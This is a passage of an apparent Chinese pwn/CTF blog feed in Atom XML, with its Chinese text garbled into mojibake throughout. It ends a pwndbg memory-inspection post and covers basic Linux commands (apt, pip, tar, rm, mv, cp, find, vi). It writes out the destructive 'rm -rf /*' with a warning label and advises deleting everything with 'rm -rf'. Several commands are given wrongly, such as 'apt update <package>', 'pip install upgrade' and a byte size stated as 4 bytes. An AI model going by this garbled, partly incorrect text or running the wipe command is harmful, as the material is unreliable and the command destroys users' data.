ä»lençš„é¦–åœ°å€å¼€å§‹ï¼Œæ˜¾ç¤ºé¦–åœ°å€åé¢10ä¸ªåœ°å€ï¼Œä»¥16è¿›åˆ¶çš„å½¢å¼ï¼Œæ‰“å°4ä¸ªå­—èŠ‚</span><br></pre></td></tr></table></figure><p>æ¥ä¸ªå…·ä½“çš„ä¾‹å­ï¼šæƒ³çœ‹ä»¥åœ°å€0x00aa11ä¸ºå¼€å¤´ï¼Œåç»­8ä¸ªå­—èŠ‚çš„å†…å­˜é‡Œçš„å†…å®¹ï¼Œå†…å®¹çš„è¡¨ç¤ºæ–¹å¼ä¸º10è¿›åˆ¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x/8db 0x00aa11</span><br><span class="line">è§£é‡Šä¸€ä¸‹ï¼š</span><br><span class="line">8ï¼šä»£è¡¨çœ‹8æ¡åœ°å€</span><br><span class="line">bï¼šä»£è¡¨8çš„å•ä½æ˜¯å•å­—èŠ‚(4byte)</span><br><span class="line">dï¼šä»£è¡¨å†…å­˜çš„å†…å®¹ç”¨10è¿›åˆ¶çš„è¡¨ç°å½¢å¼ç»™æ˜¾ç¤ºå‡ºæ¥</span><br></pre></td></tr></table></figure><h2 id="5-å…¶ä»–"><a href="#5-å…¶ä»–" class="headerlink" title="5.å…¶ä»–"></a>5.å…¶ä»–</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">disas addr <span class="comment">#æŸ¥çœ‹addrå¤„å‰åçš„åæ±‡ç¼–ä»£ç </span></span><br><span class="line"></span><br><span class="line">stack 20 <span class="comment">#æŸ¥çœ‹æ ˆå†…20ä¸ªå€¼</span></span><br><span class="line"></span><br><span class="line">show args <span class="comment">#æŸ¥çœ‹å‚æ•°</span></span><br><span class="line"></span><br><span class="line">vmmap <span class="comment">#æŸ¥çœ‹æ˜ å°„çŠ¶å†µ pedaå¸¦æœ‰</span></span><br><span class="line"></span><br><span class="line">readelf <span class="comment">#æŸ¥çœ‹elfæ–‡ä»¶ä¸­å„ä¸ªæ®µçš„èµ·å§‹åœ°å€ pedaå¸¦æœ‰</span></span><br><span class="line"></span><br><span class="line">parseheap <span class="comment">#æ˜¾ç¤ºå †çŠ¶å†µ pedaå¸¦æœ‰</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwndbgè°ƒè¯•&quot;&gt;&lt;a href=&quot;#pwndbgè°ƒè¯•&quot; class=&quot;headerlink&quot; title=&quot;pwndbgè°ƒè¯•&quot;&gt;&lt;/a&gt;pwndbgè°ƒè¯•&lt;/h1&gt;&lt;h2 id=&quot;1-b-xx&quot;&gt;&lt;a href=&quot;#1-b-xx&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="ç©è½¬PWN" scheme="https://pwnling.github.io/categories/%E7%8E%A9%E8%BD%ACPWN/"/>
    
    
  </entry>
  
  <entry>
    <title>åŸºæœ¬linuxæ“ä½œ</title>
    <link href="https://pwnling.github.io/2022/12/02/3-Linux%E5%91%BD%E4%BB%A4/"/>
    <id>https://pwnling.github.io/2022/12/02/3-Linux%E5%91%BD%E4%BB%A4/</id>
    <published>2022-12-02T01:00:00.000Z</published>
    <updated>2022-12-02T01:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="åŸºæœ¬linuxæ“ä½œ"><a href="#åŸºæœ¬linuxæ“ä½œ" class="headerlink" title="åŸºæœ¬linuxæ“ä½œ"></a>åŸºæœ¬linuxæ“ä½œ</h1><h2 id="åŸºæœ¬çŸ¥è¯†ç§‘æ™®"><a href="#åŸºæœ¬çŸ¥è¯†ç§‘æ™®" class="headerlink" title="åŸºæœ¬çŸ¥è¯†ç§‘æ™®"></a>åŸºæœ¬çŸ¥è¯†ç§‘æ™®</h2><p>UbuntuåŸºäºDebianå‘è¡Œç‰ˆå’ŒGnomeæ¡Œé¢ç¯å¢ƒï¼Œè€Œä»11.04ç‰ˆèµ·ï¼ŒUbuntuå‘è¡Œç‰ˆæ”¾å¼ƒäº†Gnomeæ¡Œé¢ç¯å¢ƒï¼Œæ”¹ä¸ºUnityã€‚ä»å‰äººä»¬è®¤ä¸ºLinuxéš¾ä»¥å®‰è£…ã€éš¾ä»¥ä½¿ç”¨ï¼Œåœ¨Ubuntuå‡ºç°åè¿™äº›éƒ½æˆä¸ºäº†å†å²ã€‚</p><p>å¹¿ä¹‰çš„Debianæ˜¯æŒ‡ä¸€ä¸ªè‡´åŠ›äºåˆ›å»ºè‡ªç”±æ“ä½œç³»ç»Ÿçš„åˆä½œç»„ç»‡åŠå…¶ä½œå“ï¼Œç”±äºDebiané¡¹ç›®ä¼—å¤šå†…æ ¸åˆ†æ”¯ä¸­ä»¥Linuxå®å†…æ ¸ä¸ºä¸»ï¼Œè€Œä¸”Debianå¼€å‘è€… æ‰€åˆ›å»ºçš„æ“ä½œç³»ç»Ÿä¸­ç»å¤§éƒ¨åˆ†åŸºç¡€å·¥å…·æ¥è‡ªäºGNUå·¥ç¨‹ ï¼Œå› æ­¤ â€œDebianâ€ å¸¸æŒ‡Debian GNU/Linuxã€‚</p><h2 id="su"><a href="#su" class="headerlink" title="su"></a>su</h2><p>suå‘½ä»¤ä¸èƒ½åˆ‡æ¢rootï¼Œæç¤ºsu: Authentication failureï¼Œåªè¦ä½ sudo passwd rootè¿‡ä¸€æ¬¡ä¹‹åï¼Œä¸‹æ¬¡å†suçš„æ—¶å€™åªè¦è¾“å…¥å¯†ç å°±å¯ä»¥æˆåŠŸç™»å½•äº†ã€‚</p><p><img src="https://img-blog.csdn.net/20180504141111862" alt="img"></p><h2 id="aptå‘½ä»¤"><a href="#aptå‘½ä»¤" class="headerlink" title="aptå‘½ä»¤"></a>aptå‘½ä»¤</h2><p>aptï¼ˆAdvanced Packaging Toolï¼‰æ˜¯ä¸€ä¸ªåœ¨ Debian å’Œ Ubuntu ä¸­çš„ Shell å‰ç«¯è½¯ä»¶åŒ…ç®¡ç†å™¨ã€‚<br>apt [options] [command] [package â€¦]<br><em>optionsï¼šå¯é€‰ï¼Œé€‰é¡¹åŒ…æ‹¬ -hï¼ˆå¸®åŠ©ï¼‰ï¼Œ-yï¼ˆå½“å®‰è£…è¿‡ç¨‹æç¤ºé€‰æ‹©å…¨éƒ¨ä¸ºâ€yesâ€ï¼‰ï¼Œ-qï¼ˆä¸æ˜¾ç¤ºå®‰è£…çš„è¿‡ç¨‹ï¼‰ç­‰ç­‰ã€‚</em><br><em>commandï¼šè¦è¿›è¡Œçš„æ“ä½œã€‚</em><br><em>packageï¼šå®‰è£…çš„åŒ…åã€‚</em></p><h3 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥æ‰¾è½¯ä»¶åŒ…å‘½ä»¤ï¼šapt search [package â€¦]</span><br><span class="line">æŸ¥çœ‹è½¯ä»¶åŒ…å‘½ä»¤ï¼šapt show [package â€¦]</span><br><span class="line">åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…çš„åŒ…ï¼šapt list --installed</span><br><span class="line">åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…çš„åŒ…çš„ç‰ˆæœ¬ä¿¡æ¯ï¼šapt list --all-versions</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å®‰è£…æŒ‡å®šçš„è½¯ä»¶å‘½ä»¤ï¼šsudo apt install &lt;package_name&gt;</span><br><span class="line">å®‰è£…å¤šä¸ªè½¯ä»¶åŒ…ï¼šsudo apt install &lt;package_1&gt; &lt;package_2&gt; &lt;package_3&gt;</span><br><span class="line">å®‰è£…æŒ‡å®šç‰ˆæœ¬åŒ…ï¼šsudo apt instal &lt;package_name&gt;=&lt;version_number&gt;</span><br></pre></td></tr></table></figure><h3 id="æ›´æ–°"><a href="#æ›´æ–°" class="headerlink" title="æ›´æ–°"></a>æ›´æ–°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å‡çº§æ‰€æœ‰è½¯ä»¶åŒ…ï¼šsudo apt upgrade</span><br><span class="line">æ›´æ–°æŒ‡å®šçš„è½¯ä»¶å‘½ä»¤ï¼šsudo apt update &lt;package_name&gt; #upgradeå‡çº§ï¼›updateæ›´æ–°</span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åˆ é™¤è½¯ä»¶åŒ…å‘½ä»¤ï¼šsudo apt remove &lt;package_name&gt;</span><br></pre></td></tr></table></figure><h2 id="pipå‘½ä»¤"><a href="#pipå‘½ä»¤" class="headerlink" title="pipå‘½ä»¤"></a>pipå‘½ä»¤</h2><p>pip æ˜¯ Python åŒ…ç®¡ç†å·¥å…·ï¼Œè¯¥å·¥å…·æä¾›äº†å¯¹Python åŒ…çš„æŸ¥æ‰¾ã€ä¸‹è½½ã€å®‰è£…ã€å¸è½½çš„åŠŸèƒ½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹pipç‰ˆæœ¬ï¼špip --version/pip -V</span><br><span class="line">å®‰è£…pythonåŒ…ï¼špip install &lt;package_name&gt;</span><br><span class="line">å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„pythonåŒ…ï¼špip install &lt;package_nmae&gt;==&lt;version_number&gt;</span><br><span class="line">å‡çº§ï¼špip install upgrade &lt;package_name&gt;</span><br><span class="line">å¸è½½ï¼špip uninstall &lt;package_name&gt;</span><br><span class="line">åˆ—å‡ºå·²å®‰è£…çš„åŒ…ï¼špip list</span><br><span class="line">æ˜¾ç¤ºå®‰è£…åŒ…ä¿¡æ¯ï¼špip show &lt;package_name&gt;</span><br><span class="line">å‡çº§pipï¼špip install -U pip</span><br></pre></td></tr></table></figure><h2 id="å‹ç¼©æ–‡ä»¶æ“ä½œ"><a href="#å‹ç¼©æ–‡ä»¶æ“ä½œ" class="headerlink" title="å‹ç¼©æ–‡ä»¶æ“ä½œ"></a>å‹ç¼©æ–‡ä»¶æ“ä½œ</h2><h3 id="æ‰“åŒ…å’Œå‹ç¼©"><a href="#æ‰“åŒ…å’Œå‹ç¼©" class="headerlink" title="æ‰“åŒ…å’Œå‹ç¼©"></a>æ‰“åŒ…å’Œå‹ç¼©</h3><p>linuxä¸­çš„æ‰“åŒ…æ–‡ä»¶ï¼šaa.tar<br>linuxä¸­çš„å‹ç¼©æ–‡ä»¶ï¼šbb.gz<br>linuxä¸­æ‰“åŒ…å¹¶å‹ç¼©çš„æ–‡ä»¶ï¼š.tar.gz</p><p>Linuxä¸­çš„æ‰“åŒ…æ–‡ä»¶ä¸€èˆ¬æ˜¯ä»¥.tarç»“å°¾çš„ï¼Œå‹ç¼©çš„å‘½ä»¤ä¸€èˆ¬æ˜¯ä»¥.gzç»“å°¾çš„ã€‚<br>è€Œä¸€èˆ¬æƒ…å†µä¸‹æ‰“åŒ…å’Œå‹ç¼©æ˜¯ä¸€èµ·è¿›è¡Œçš„ï¼Œæ‰“åŒ…å¹¶å‹ç¼©åçš„æ–‡ä»¶çš„åç¼€åä¸€èˆ¬.tar.gzã€‚</p><p>å‘½ä»¤ï¼štar -zcvf æ‰“åŒ…å‹ç¼©åçš„æ–‡ä»¶å è¦æ‰“åŒ…çš„æ–‡ä»¶<br>å…¶ä¸­ï¼šzï¼šè°ƒç”¨gzipå‹ç¼©å‘½ä»¤è¿›è¡Œå‹ç¼©<br>  cï¼šæ‰“åŒ…æ–‡ä»¶<br>  vï¼šæ˜¾ç¤ºè¿è¡Œè¿‡ç¨‹<br>  fï¼šæŒ‡å®šæ–‡ä»¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ï¼šæ‰“åŒ…å¹¶å‹ç¼©/usr/tmp ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ å‹ç¼©åçš„å‹ç¼©åŒ…æŒ‡å®šåç§°ä¸ºxxx.tar</span><br><span class="line">tar -zcvf ab.tar aa.txt bb.txt </span><br><span class="line">æˆ–ï¼štar -zcvf ab.tar  *</span><br></pre></td></tr></table></figure><h3 id="è§£å‹"><a href="#è§£å‹" class="headerlink" title="è§£å‹"></a>è§£å‹</h3><p>å‘½ä»¤ï¼štar [-zxvf] å‹ç¼©æ–‡ä»¶<br>å…¶ä¸­ï¼šxï¼šä»£è¡¨è§£å‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ï¼šå°†/usr/tmp ä¸‹çš„ab.tarè§£å‹åˆ°å½“å‰ç›®å½•ä¸‹</span><br><span class="line">tar -zxvf ab.tar</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ï¼šå°†/usr/tmp ä¸‹çš„ab.tarè§£å‹åˆ°æ ¹ç›®å½•/usrä¸‹</span><br><span class="line">tar -zxvf ab.tar -C /usr------Cä»£è¡¨æŒ‡å®šè§£å‹çš„ä½ç½®</span><br><span class="line">tar -zxvf ab.tar -C /usr/</span><br></pre></td></tr></table></figure><h2 id="ç›®å½•æ“ä½œå‘½ä»¤"><a href="#ç›®å½•æ“ä½œå‘½ä»¤" class="headerlink" title="ç›®å½•æ“ä½œå‘½ä»¤"></a>ç›®å½•æ“ä½œå‘½ä»¤</h2><h3 id="ç›®å½•åˆ‡æ¢-cd"><a href="#ç›®å½•åˆ‡æ¢-cd" class="headerlink" title="ç›®å½•åˆ‡æ¢ cd"></a>ç›®å½•åˆ‡æ¢ cd</h3><p>å‘½ä»¤ï¼šcd ç›®å½•</p><p>cd /        åˆ‡æ¢åˆ°æ ¹ç›®å½•<br>cd /usr        åˆ‡æ¢åˆ°æ ¹ç›®å½•ä¸‹çš„usrç›®å½•<br>cd ../        åˆ‡æ¢åˆ°ä¸Šä¸€çº§ç›®å½• æˆ–è€…  cd ..<br>cd ~        åˆ‡æ¢åˆ°homeç›®å½•<br>cd -        åˆ‡æ¢åˆ°ä¸Šæ¬¡è®¿é—®çš„ç›®å½•</p><h3 id="ç›®å½•æŸ¥çœ‹-ls-al"><a href="#ç›®å½•æŸ¥çœ‹-ls-al" class="headerlink" title="ç›®å½•æŸ¥çœ‹ ls [-al]"></a>ç›®å½•æŸ¥çœ‹ ls [-al]</h3><p>å‘½ä»¤ï¼šls [-al]</p><p>ls                æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶<br>ls -a            æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶ï¼ˆåŒ…æ‹¬éšè—çš„æ–‡ä»¶ï¼‰<br>ls -l æˆ– ll       åˆ—è¡¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶ï¼ˆåˆ—è¡¨æŸ¥çœ‹ï¼Œæ˜¾ç¤ºæ›´å¤šä¿¡æ¯ï¼‰<br>ls /dir            æŸ¥çœ‹æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶   å¦‚ï¼šls /usr</p><h3 id="ç›®å½•æ“ä½œã€å¢ï¼Œåˆ ï¼Œæ”¹ï¼ŒæŸ¥ã€‘"><a href="#ç›®å½•æ“ä½œã€å¢ï¼Œåˆ ï¼Œæ”¹ï¼ŒæŸ¥ã€‘" class="headerlink" title="ç›®å½•æ“ä½œã€å¢ï¼Œåˆ ï¼Œæ”¹ï¼ŒæŸ¥ã€‘"></a>ç›®å½•æ“ä½œã€å¢ï¼Œåˆ ï¼Œæ”¹ï¼ŒæŸ¥ã€‘</h3><h4 id="åˆ›å»ºç›®å½•ã€å¢ã€‘-mkdir"><a href="#åˆ›å»ºç›®å½•ã€å¢ã€‘-mkdir" class="headerlink" title="åˆ›å»ºç›®å½•ã€å¢ã€‘ mkdir"></a>åˆ›å»ºç›®å½•ã€å¢ã€‘ mkdir</h4><p>å‘½ä»¤ï¼šmkdir ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir    aaa            åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºaaaçš„ç›®å½•</span><br><span class="line">mkdir    /usr/aaa    åœ¨æŒ‡å®šç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºaaaçš„ç›®å½•</span><br></pre></td></tr></table></figure><h4 id="åˆ é™¤ç›®å½•æˆ–æ–‡ä»¶ã€åˆ ã€‘rm"><a href="#åˆ é™¤ç›®å½•æˆ–æ–‡ä»¶ã€åˆ ã€‘rm" class="headerlink" title="åˆ é™¤ç›®å½•æˆ–æ–‡ä»¶ã€åˆ ã€‘rm"></a>åˆ é™¤ç›®å½•æˆ–æ–‡ä»¶ã€åˆ ã€‘rm</h4><p>å‘½ä»¤ï¼šrm [-rf] ç›®å½•</p><p>åˆ é™¤æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm æ–‡ä»¶        åˆ é™¤å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line">rm -f æ–‡ä»¶    åˆ é™¤å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼ˆä¸è¯¢é—®ï¼‰</span><br></pre></td></tr></table></figure><p>åˆ é™¤ç›®å½•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -r aaa    é€’å½’åˆ é™¤å½“å‰ç›®å½•ä¸‹çš„aaaç›®å½•</span><br><span class="line">rm -rf aaa    é€’å½’åˆ é™¤å½“å‰ç›®å½•ä¸‹çš„aaaç›®å½•ï¼ˆä¸è¯¢é—®ï¼‰</span><br></pre></td></tr></table></figure><p>å…¨éƒ¨åˆ é™¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf *    å°†å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶å…¨éƒ¨åˆ é™¤</span><br><span class="line">rm -rf /*    ã€è‡ªæ€å‘½ä»¤ï¼æ…ç”¨ï¼æ…ç”¨ï¼æ…ç”¨ï¼ã€‘å°†æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å…¨éƒ¨åˆ é™¤</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šrmä¸ä»…å¯ä»¥åˆ é™¤ç›®å½•ï¼Œä¹Ÿå¯ä»¥åˆ é™¤å…¶ä»–æ–‡ä»¶æˆ–å‹ç¼©åŒ…ï¼Œä¸ºäº†æ–¹ä¾¿å¤§å®¶çš„è®°å¿†ï¼Œæ— è®ºåˆ é™¤ä»»ä½•ç›®å½•æˆ–æ–‡ä»¶ï¼Œéƒ½ç›´æ¥ä½¿ç”¨ <strong>rm -rf ç›®å½•/æ–‡ä»¶/å‹ç¼©åŒ…</strong></p><h4 id="ç›®å½•ä¿®æ”¹ã€æ”¹ã€‘mv-å’Œ-cp"><a href="#ç›®å½•ä¿®æ”¹ã€æ”¹ã€‘mv-å’Œ-cp" class="headerlink" title="ç›®å½•ä¿®æ”¹ã€æ”¹ã€‘mv å’Œ cp"></a>ç›®å½•ä¿®æ”¹ã€æ”¹ã€‘mv å’Œ cp</h4><h5 id="ä¸€ã€é‡å‘½åç›®å½•"><a href="#ä¸€ã€é‡å‘½åç›®å½•" class="headerlink" title="ä¸€ã€é‡å‘½åç›®å½•"></a>ä¸€ã€é‡å‘½åç›®å½•</h5><p>â€‹    å‘½ä»¤ï¼šmv å½“å‰ç›®å½•  æ–°ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¾‹å¦‚ï¼šmv aaa bbb    å°†ç›®å½•aaaæ”¹ä¸ºbbb</span><br></pre></td></tr></table></figure><p>â€‹    æ³¨æ„ï¼šmvçš„è¯­æ³•ä¸ä»…å¯ä»¥å¯¹ç›®å½•è¿›è¡Œé‡å‘½åè€Œä¸”ä¹Ÿå¯ä»¥å¯¹å„ç§æ–‡ä»¶ï¼Œå‹ç¼©åŒ…ç­‰è¿›è¡Œ    é‡å‘½åçš„æ“ä½œ</p><h5 id="äºŒã€å‰ªåˆ‡ç›®å½•"><a href="#äºŒã€å‰ªåˆ‡ç›®å½•" class="headerlink" title="äºŒã€å‰ªåˆ‡ç›®å½•"></a>äºŒã€å‰ªåˆ‡ç›®å½•</h5><p>â€‹    å‘½ä»¤ï¼šmv ç›®å½•åç§° ç›®å½•çš„æ–°ä½ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ï¼šå°†/usr/tmpç›®å½•ä¸‹çš„aaaç›®å½•å‰ªåˆ‡åˆ° /usrç›®å½•ä¸‹é¢     mv /usr/tmp/aaa /usr</span><br></pre></td></tr></table></figure><p>â€‹    æ³¨æ„ï¼šmvè¯­æ³•ä¸ä»…å¯ä»¥å¯¹ç›®å½•è¿›è¡Œå‰ªåˆ‡æ“ä½œï¼Œå¯¹æ–‡ä»¶å’Œå‹ç¼©åŒ…ç­‰éƒ½å¯æ‰§è¡Œå‰ªåˆ‡æ“ä½œ</p><h5 id="ä¸‰ã€æ‹·è´ç›®å½•"><a href="#ä¸‰ã€æ‹·è´ç›®å½•" class="headerlink" title="ä¸‰ã€æ‹·è´ç›®å½•"></a>ä¸‰ã€æ‹·è´ç›®å½•</h5><p>â€‹    å‘½ä»¤ï¼šcp -r ç›®å½•åç§° ç›®å½•æ‹·è´çš„ç›®æ ‡ä½ç½®   -rä»£è¡¨é€’å½’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ï¼šå°†/usr/tmpç›®å½•ä¸‹çš„aaaç›®å½•å¤åˆ¶åˆ° /usrç›®å½•ä¸‹é¢     cp /usr/tmp/aaa  /usr</span><br></pre></td></tr></table></figure><p>â€‹    æ³¨æ„ï¼šcpå‘½ä»¤ä¸ä»…å¯ä»¥æ‹·è´ç›®å½•è¿˜å¯ä»¥æ‹·è´æ–‡ä»¶ï¼Œå‹ç¼©åŒ…ç­‰ï¼Œæ‹·è´æ–‡ä»¶å’Œå‹ç¼©åŒ…æ—¶ä¸ç”¨å†™-ré€’å½’</p><h4 id="æœç´¢ç›®å½•ã€æŸ¥ã€‘find"><a href="#æœç´¢ç›®å½•ã€æŸ¥ã€‘find" class="headerlink" title="æœç´¢ç›®å½•ã€æŸ¥ã€‘find"></a>æœç´¢ç›®å½•ã€æŸ¥ã€‘find</h4><p>å‘½ä»¤ï¼šfind ç›®å½• å‚æ•° æ–‡ä»¶åç§°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ï¼šfind /usr/tmp -name &#x27;a*&#x27;    æŸ¥æ‰¾/usr/tmpç›®å½•ä¸‹çš„æ‰€æœ‰ä»¥aå¼€å¤´çš„ç›®å½•æˆ–æ–‡ä»¶</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶æ“ä½œå‘½ä»¤"><a href="#æ–‡ä»¶æ“ä½œå‘½ä»¤" class="headerlink" title="æ–‡ä»¶æ“ä½œå‘½ä»¤"></a>æ–‡ä»¶æ“ä½œå‘½ä»¤</h2><h3 id="æ–‡ä»¶æ“ä½œã€å¢ï¼Œåˆ ï¼Œæ”¹ï¼ŒæŸ¥ã€‘"><a href="#æ–‡ä»¶æ“ä½œã€å¢ï¼Œåˆ ï¼Œæ”¹ï¼ŒæŸ¥ã€‘" class="headerlink" title="æ–‡ä»¶æ“ä½œã€å¢ï¼Œåˆ ï¼Œæ”¹ï¼ŒæŸ¥ã€‘"></a>æ–‡ä»¶æ“ä½œã€å¢ï¼Œåˆ ï¼Œæ”¹ï¼ŒæŸ¥ã€‘</h3><h4 id="æ–°å»ºæ–‡ä»¶ã€å¢ã€‘touch"><a href="#æ–°å»ºæ–‡ä»¶ã€å¢ã€‘touch" class="headerlink" title="æ–°å»ºæ–‡ä»¶ã€å¢ã€‘touch"></a>æ–°å»ºæ–‡ä»¶ã€å¢ã€‘touch</h4><p>å‘½ä»¤ï¼štouch æ–‡ä»¶å<br>ç¤ºä¾‹ï¼šåœ¨å½“å‰ç›®å½•åˆ›å»ºä¸€ä¸ªåä¸ºaa.txtçš„æ–‡ä»¶        touch  aa.txt</p><h4 id="åˆ é™¤æ–‡ä»¶-ã€åˆ ã€‘-rm"><a href="#åˆ é™¤æ–‡ä»¶-ã€åˆ ã€‘-rm" class="headerlink" title="åˆ é™¤æ–‡ä»¶ ã€åˆ ã€‘ rm"></a>åˆ é™¤æ–‡ä»¶ ã€åˆ ã€‘ rm</h4><p>å‘½ä»¤ï¼šrm -rf æ–‡ä»¶å</p><h4 id="ä¿®æ”¹æ–‡ä»¶ã€æ”¹ã€‘-viæˆ–vim"><a href="#ä¿®æ”¹æ–‡ä»¶ã€æ”¹ã€‘-viæˆ–vim" class="headerlink" title="ä¿®æ”¹æ–‡ä»¶ã€æ”¹ã€‘ viæˆ–vim"></a>ä¿®æ”¹æ–‡ä»¶ã€æ”¹ã€‘ viæˆ–vim</h4><p>ã€viç¼–è¾‘å™¨çš„3ç§æ¨¡å¼ã€‘<br>    åŸºæœ¬ä¸Šviå¯ä»¥åˆ†ä¸ºä¸‰ç§çŠ¶æ€ï¼Œåˆ†åˆ«æ˜¯å‘½ä»¤æ¨¡å¼ï¼ˆcommand modeï¼‰ã€æ’å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰å’Œåº•è¡Œæ¨¡å¼ï¼ˆlast line modeï¼‰ï¼Œå„æ¨¡å¼çš„åŠŸèƒ½åŒºåˆ†å¦‚ä¸‹ï¼š</p><p>1) å‘½ä»¤è¡Œæ¨¡å¼command modeï¼‰<br>      æ§åˆ¶å±å¹•å…‰æ ‡çš„ç§»åŠ¨ï¼Œå­—ç¬¦ã€å­—æˆ–è¡Œçš„åˆ é™¤ï¼ŒæŸ¥æ‰¾ï¼Œç§»åŠ¨å¤åˆ¶æŸåŒºæ®µåŠè¿›å…¥Insert modeä¸‹ï¼Œæˆ–è€…åˆ° last line modeã€‚<br>      å‘½ä»¤è¡Œæ¨¡å¼ä¸‹çš„å¸¸ç”¨å‘½ä»¤ï¼š<br>      ã€1ã€‘æ§åˆ¶å…‰æ ‡ç§»åŠ¨ï¼šâ†‘ï¼Œâ†“ï¼Œj<br>      ã€2ã€‘åˆ é™¤å½“å‰è¡Œï¼šdd<br>      ã€3ã€‘æŸ¥æ‰¾ï¼š/å­—ç¬¦<br>      ã€4ã€‘è¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼ši o a<br>      ã€5ã€‘è¿›å…¥åº•è¡Œæ¨¡å¼ï¼š:</p><p>2) ç¼–è¾‘æ¨¡å¼ï¼ˆInsert modeï¼‰<br>      åªæœ‰åœ¨Insert modeä¸‹ï¼Œæ‰å¯ä»¥åšæ–‡å­—è¾“å…¥ï¼ŒæŒ‰ã€ŒESCã€é”®å¯å›åˆ°å‘½ä»¤è¡Œæ¨¡å¼ã€‚<br>      ç¼–è¾‘æ¨¡å¼ä¸‹å¸¸ç”¨å‘½ä»¤ï¼š<br>      ã€1ã€‘ESC é€€å‡ºç¼–è¾‘æ¨¡å¼åˆ°å‘½ä»¤è¡Œæ¨¡å¼ï¼›</p><p>3) åº•è¡Œæ¨¡å¼ï¼ˆlast line modeï¼‰<br>     